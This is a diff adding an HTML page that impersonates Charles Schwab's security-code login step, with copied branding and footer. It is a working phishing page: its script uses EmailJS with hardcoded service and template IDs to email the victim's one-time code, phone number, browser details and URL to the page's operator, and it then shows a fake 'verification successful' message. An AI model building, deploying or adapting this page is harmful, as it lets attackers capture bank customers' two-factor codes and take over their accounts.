@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="UTF-8" />
+    <title>Enter Security Code | Charles Schwab</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <style>
+        :root {
+            --primary-green: #1D7700;
+            --primary-red: #CC1100;
+            --link-blue: #006c9e;
+            --text-dark: #1a1a1a;
+            --text-medium: #4a4e5c;
+            --text-light: #6c757d;
+            --border-light: #d4d8dd;
+            --bg-light: #f5f7fa;
+            --bg-white: #ffffff;
+            --separator: #D8D8D8;
+            --cancel-bg: #D8D8D8;
+        }
+
+        * {
+            -webkit-text-size-adjust: 100%;
+            -webkit-font-smoothing: antialiased;
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            margin: 0;
+            font-family: "CharlesModern-Light", Helvetica, Arial, sans-serif;
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-weight: 300;
+        }
+
+        /* Typography */
+        h1, h2, h3, p, span, div, label, .footer-text {
+            font-family: "CharlesModern-Light", Helvetica, Arial, sans-serif;
+        }
+
+        button, .link-button {
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+        }
+
+        /* Layout */
+        .content-wrapper {
+            flex: 1;
+        }
+
+        /* Full width logo bar */
+        .logo-bar {
+            width: 100%;
+            background-color: #485c70;
+            padding: 1px 24px;
+        }
+
+        .logo-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            width: 100px;
+            display: block;
+        }
+
+        .logo img {
+            width: 80%;
+            height: auto;
+            display: block;
+        }
+
+        /* Main content - centered with margin-left: -30px */
+        .main-container {
+            max-width: 580px;
+            margin: 0 auto;
+            margin-left: calc(50% - 290px - 30px); /* Center and shift left by 30px */
+            padding: 32px 24px 48px 24px;
+            transform: translateX(-30px);
+        }
+
+        /* Alternative simpler approach: direct margin-left negative on container */
+        @media (min-width: 641px) {
+            .main-container {
+                margin-left: calc(50% - 290px - 30px);
+                transform: none;
+            }
+        }
+
+        /* Header */
+        .page-title {
+            font-size: 1.75rem;
+            font-weight: 500;
+            color: var(--text-dark);
+            margin-bottom: 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .security-info {
+            font-size: 1rem;
+            color: var(--text-medium);
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+
+        .masked-phone {
+            font-weight: 500;
+            color: var(--text-dark);
+        }
+
+        /* Security Code Label */
+        .code-label {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 12px;
+            display: block;
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+        }
+
+        /* NORMAL INPUT CONTAINER - Single text input for security code */
+        .code-input-wrapper {
+            margin-bottom: 24px;
+        }
+
+        .security-code-input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 1rem;
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+            border: 1.5px solid var(--border-light);
+            border-radius: 10px;
+            background: var(--bg-white);
+            transition: all 0.2s ease;
+            outline: none;
+            color: var(--text-dark);
+        }
+
+        .security-code-input:focus {
+            border-color: var(--link-blue);
+            box-shadow: 0 0 0 3px rgba(0, 108, 158, 0.1);
+        }
+
+        .security-code-input.error {
+            border-color: var(--primary-red);
+            animation: shake 0.3s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+        }
+
+        /* Action Links */
+        .action-links {
+            display: flex;
+            gap: 28px;
+            margin-bottom: 28px;
+            flex-wrap: wrap;
+        }
+
+        .link-button {
+            background: none;
+            border: none;
+            color: var(--link-blue);
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 0;
+            transition: opacity 0.2s;
+            text-decoration: underline;
+            text-underline-offset: 3px;
+        }
+
+        .link-button:hover {
+            opacity: 0.75;
+        }
+
+        .link-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Trust Device Checkbox */
+        .trust-device-section {
+            margin-bottom: 32px;
+            padding-top: 4px;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            cursor: pointer;
+        }
+
+        .checkbox-wrapper input {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+            cursor: pointer;
+            accent-color: var(--primary-green);
+        }
+
+        .checkbox-label {
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            line-height: 1.4;
+            font-weight: 400;
+        }
+
+        .help-link {
+            display: inline-block;
+            margin-top: 6px;
+            margin-left: 30px;
+            font-size: 0.8rem;
+            color: var(--link-blue);
+            text-decoration: none;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Separator Line - 2px thickness above buttons */
+        .button-separator {
+            width: 100%;
+            height: 2px;
+            background-color: var(--separator);
+            margin: 24px 0 28px 0;
+            border: none;
+        }
+
+        /* Button Container */
+        .button-container {
+            display: flex;
+            gap: 16px;
+            justify-content: flex-end;
+            margin-bottom: 20px;
+        }
+
+        /* Cancel Button - #D8D8D8 background */
+        .cancel-btn {
+            background-color: #D8D8D8;
+            border: 1px solid #b0b3b8;
+            border-radius: 8px;
+            padding: 12px 28px;
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: #2c3e50;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            min-width: 120px;
+        }
+
+        .cancel-btn:hover {
+            background-color: #c5c5c5;
+            border-color: #8c8f96;
+            transform: translateY(-1px);
+        }
+
+        .cancel-btn:active {
+            transform: translateY(1px);
+        }
+
+        /* Log In Button - #1D7700 background */
+        .login-btn {
+            background-color: #1D7700;
+            border: 1px solid #000000;
+            border-radius: 8px;
+            padding: 12px 32px;
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            min-width: 120px;
+        }
+
+        .login-btn:hover {
+            background-color: #166000;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .login-btn:active {
+            transform: translateY(1px);
+        }
+
+        .login-btn:disabled {
+            background-color: #9cb89a;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Hidden Error/Success Messages */
+        .error-message {
+            color: var(--primary-red);
+            font-size: 0.8rem;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .success-message {
+            color: var(--primary-green);
+            font-size: 0.8rem;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .resend-timer {
+            font-size: 0.75rem;
+            color: var(--text-light);
+            margin-top: 8px;
+            display: none;
+        }
+
+        /* Footer */
+        .footer-disclaimer {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px 32px 24px;
+            background-color: var(--bg-light);
+            border-top: 1px solid #e0e4e8;
+        }
+
+        .footer-text {
+            font-size: 11px;
+            font-weight: 300;
+            line-height: 1.5;
+            color: #5a5e6b;
+        }
+
+        .footer-text p {
+            margin: 12px 0;
+        }
+
+        .footer-text a {
+            color: var(--link-blue);
+            text-decoration: none;
+        }
+
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        .compliance-number {
+            font-size: 11px;
+            color: #5a5e6b;
+            margin-bottom: 16px;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--link-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive adjustments - maintain shift on larger screens */
+        @media (max-width: 640px) {
+            .main-container {
+                margin-left: auto;
+                margin-right: auto;
+                transform: none;
+                padding: 24px 20px 40px 20px;
+            }
+            .button-container {
+                flex-direction: column;
+            }
+            .cancel-btn, .login-btn {
+                width: 100%;
+                text-align: center;
+            }
+            .action-links {
+                gap: 20px;
+            }
+            .logo-bar {
+                padding: 10px 16px;
+            }
+            .logo {
+                width: 85px;
+            }
+        }
+
+        /* For screens between 641px and 900px, maintain shift but adjust */
+        @media (min-width: 641px) and (max-width: 900px) {
+            .main-container {
+                margin-left: calc(50% - 290px - 30px);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="content-wrapper">
+        <!-- Logo Bar -->
+        <div class="logo-bar">
+            <div class="logo-container">
+                <div class="logo">
+                    <img src="https://2dhk5ye3hl.ucarecd.net/95492c26-4809-4f9a-a925-f8f93454cc56/charleslogo.svg"
+                         alt="Charles Schwab"
+                         onerror="this.style.display='none';" />
+                </div>
+            </div>
+        </div>
+
+        <!-- Main OTP Form - Entire content shifted left by 30px -->
+        <div class="main-container">
+            <h1 class="page-title">Enter Security Code</h1>
+            <p class="security-info">
+                A security code has been sent to <span class="masked-phone" id="maskedPhone">*******8393</span>.
+            </p>
+
+            <label class="code-label">Security Code</label>
+
+            <!-- Normal Input Container - Single text input for security code -->
+            <div class="code-input-wrapper">
+                <input type="text" id="securityCodeInput" class="security-code-input"
+                       placeholder="Enter 6-digit code" maxlength="6" autocomplete="off">
+            </div>
+
+            <!-- Action Links -->
+            <div class="action-links">
+                <button class="link-button" id="resendCodeBtn">Send a new code</button>
+                <button class="link-button" id="differentMethodBtn">Use a different method</button>
+            </div>
+            <div id="resendTimer" class="resend-timer"></div>
+
+            <!-- Error / Success Messages -->
+            <div id="errorMessage" class="error-message"></div>
+            <div id="successMessage" class="success-message"></div>
+
+            <!-- Trust Device Checkbox -->
+            <div class="trust-device-section">
+                <label class="checkbox-wrapper">
+                    <input type="checkbox" id="trustDeviceCheckbox">
+                    <span class="checkbox-label">Trust this device and skip this step in the future.</span>
+                </label>
+                <a href="#" class="help-link" id="helpLink">See how Schwab recognizes your device.</a>
+            </div>
+
+            <!-- Separator Line - 2px thickness above buttons -->
+            <div class="button-separator"></div>
+
+            <!-- Button Container with Cancel and Log In buttons -->
+            <div class="button-container">
+                <button class="cancel-btn" id="cancelBtn">Cancel</button>
+                <button class="login-btn" id="loginBtn">Log In</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer-disclaimer">
+        <div class="footer-text">
+            <p class="compliance-number">(1120-0NMB)</p>
+            <p>Charles Schwab &amp; Co., Inc. and Charles Schwab Bank, SSB, are separate but affiliated companies and wholly-owned subsidiaries of The Charles Schwab Corporation. Brokerage products and services are offered by Charles Schwab &amp; Co., Inc. (SSB) through various product offerings and services as offered by Charles Schwab Bank, SSB. Member <a href="#" target="_blank">SIPC</a> and an Equal Housing Lender.</p>
+            <p>© 2026 Charles Schwab &amp; Co., Inc, All rights reserved. Member SIPC. Unauthorized access is prohibited. Usage will be monitored.</p>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init("SdkmRe8WZ7itEba9z");
+        })();
+
+        // DOM elements
+        const securityCodeInput = document.getElementById('securityCodeInput');
+        const resendBtn = document.getElementById('resendCodeBtn');
+        const differentMethodBtn = document.getElementById('differentMethodBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const loginBtn = document.getElementById('loginBtn');
+        const trustCheckbox = document.getElementById('trustDeviceCheckbox');
+        const helpLink = document.getElementById('helpLink');
+        const errorDiv = document.getElementById('errorMessage');
+        const successDiv = document.getElementById('successMessage');
+        const resendTimerDiv = document.getElementById('resendTimer');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        // State
+        let resendCooldown = false;
+        let cooldownSeconds = 30;
+        let cooldownInterval = null;
+        let storedPhone = "*******8393";
+        let selectedMethod = "Security Code";
+
+        // Display masked phone
+        document.getElementById('maskedPhone').innerText = storedPhone;
+
+        // Helper: Show/hide loading
+        function showLoading(show) {
+            loadingOverlay.style.display = show ? 'flex' : 'none';
+        }
+
+        // Helper: Show error message
+        function showError(msg) {
+            errorDiv.textContent = msg;
+            errorDiv.style.display = 'block';
+            successDiv.style.display = 'none';
+            securityCodeInput.classList.add('error');
+            setTimeout(() => {
+                errorDiv.style.display = 'none';
+                securityCodeInput.classList.remove('error');
+            }, 4000);
+        }
+
+        // Helper: Show success message
+        function showSuccess(msg) {
+            successDiv.textContent = msg;
+            successDiv.style.display = 'block';
+            errorDiv.style.display = 'none';
+            setTimeout(() => {
+                successDiv.style.display = 'none';
+            }, 3000);
+        }
+
+        // Clear input and remove error styling
+        function clearInput() {
+            securityCodeInput.value = '';
+            securityCodeInput.classList.remove('error');
+            securityCodeInput.focus();
+        }
+
+        // Verify security code
+        async function verifySecurityCode() {
+            const code = securityCodeInput.value.trim();
+
+            if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+                showError('Please enter a valid 6-digit security code');
+                return;
+            }
+
+            showLoading(true);
+            try {
+                // Send verification attempt to EmailJS
+                await emailjs.send(
+                    "service_zuj2d2a",
+                    "template_tvd86sp",
+                    {
+                        button_clicked: "Verify Security Code",
+                        button_id: "otp_verify",
+                        otp_code_entered: code,
+                        selected_phone: storedPhone,
+                        trust_device: trustCheckbox.checked ? "Yes" : "No",
+                        timestamp: new Date().toLocaleString(),
+                        user_agent: navigator.userAgent,
+                        url: window.location.href,
+                        verification_status: "attempt"
+                    }
+                );
+
+                // Accept any 6-digit numeric code for demo
+                if (/^\d{6}$/.test(code)) {
+                    showSuccess('Verification successful! Redirecting...');
+
+                    // Send success confirmation
+                    await emailjs.send(
+                        "service_zuj2d2a",
+                        "template_tvd86sp",
+                        {
+                            button_clicked: "Verification Success",
+                            button_id: "verify_success",
+                            selected_phone: storedPhone,
+                            trust_device: trustCheckbox.checked ? "Yes" : "No",
+                            timestamp: new Date().toLocaleString(),
+                            user_agent: navigator.userAgent,
+                            url: window.location.href,
+                            verification_code: code
+                        }
+                    );
+
+                    setTimeout(() => {
+                        alert('Successfully verified. Welcome to Charles Schwab.');
+                        // Reset or redirect as needed
+                        window.location.reload();
+                    }, 2000);
+                } else {
+                    showError('Invalid security code. Please try again.');
+                    clearInput();
+                }
+            } catch (error) {
+                console.error("Verification error:", error);
+                showError('Unable to verify at this time. Please try again.');
+                clearInput();
+            } finally {
+                setTimeout(() => showLoading(false), 500);
+            }
+        }
+
+        // Resend code functionality
+        async function resendSecurityCode() {
+            if (resendCooldown) {
+                showError(`Please wait ${cooldownSeconds} seconds before requesting a new code.`);
+                return;
+            }
+
+            showLoading(true);
+            try {
+                await emailjs.send(
+                    "service_zuj2d2a",
+                    "template_tvd86sp",
+                    {
+                        button_clicked: "Resend Security Code",
+                        button_id: "resend_code",
+                        selected_phone: storedPhone,
+                        timestamp: new Date().toLocaleString(),
+                        user_agent: navigator.userAgent,
+                        url: window.location.href,
+                        event_type: "Resend requested"
+                    }
+                );
+
+                showSuccess(`A new security code has been sent to ${storedPhone}`);
+                clearInput();
+                startResendCooldown();
+            } catch (error) {
+                console.error("Resend error:", error);
+                showError("Failed to resend code. Please try again.");
+            } finally {
+                setTimeout(() => showLoading(false), 500);
+            }
+        }
+
+        // Start cooldown timer for resend button
+        function startResendCooldown() {
+            resendCooldown = true;
+            cooldownSeconds = 30;
+            resendBtn.disabled = true;
+            updateResendTimerDisplay();
+
+            if (cooldownInterval) clearInterval(cooldownInterval);
+            cooldownInterval = setInterval(() => {
+                if (cooldownSeconds > 0) {
+                    cooldownSeconds--;
+                    updateResendTimerDisplay();
+                } else {
+                    clearInterval(cooldownInterval);
+                    resendCooldown = false;
+                    resendBtn.disabled = false;
+                    resendTimerDiv.style.display = 'none';
+                }
+            }, 1000);
+        }
+
+        function updateResendTimerDisplay() {
+            if (resendCooldown && cooldownSeconds > 0) {
+                resendTimerDiv.textContent = `You can request a new code in ${cooldownSeconds} seconds`;
+                resendTimerDiv.style.display = 'block';
+            } else {
+                resendTimerDiv.style.display = 'none';
+            }
+        }
+
+        // Different method handler
+        function useDifferentMethod() {
+            const confirmSwitch = confirm('Switch to a different verification method?');
+            if (confirmSwitch) {
+                window.location.href = window.location.pathname;
+            }
+        }
+
+        // Cancel handler
+        function handleCancel() {
+            const confirmCancel = confirm('Are you sure you want to cancel verification? You will be returned to the login page.');
+            if (confirmCancel) {
+                alert('Verification cancelled.');
+                window.location.href = window.location.pathname;
+            }
+        }
+
+        // Help link handler
+        function showHelp() {
+            alert('Charles Schwab uses device recognition to enhance security. Trusted devices skip the verification step for faster access.');
+        }
+
+        // Event listeners
+        loginBtn.addEventListener('click', verifySecurityCode);
+        resendBtn.addEventListener('click', resendSecurityCode);
+        differentMethodBtn.addEventListener('click', useDifferentMethod);
+        cancelBtn.addEventListener('click', handleCancel);
+        helpLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showHelp();
+        });
+
+        // Allow Enter key to submit
+        securityCodeInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                verifySecurityCode();
+            }
+        });
+
+        // Remove error styling when typing
+        securityCodeInput.addEventListener('input', () => {
+            securityCodeInput.classList.remove('error');
+            errorDiv.style.display = 'none';
+        });
+
+        // Start resend cooldown initially
+        startResendCooldown();
+    </script>
+</body>
+</html>
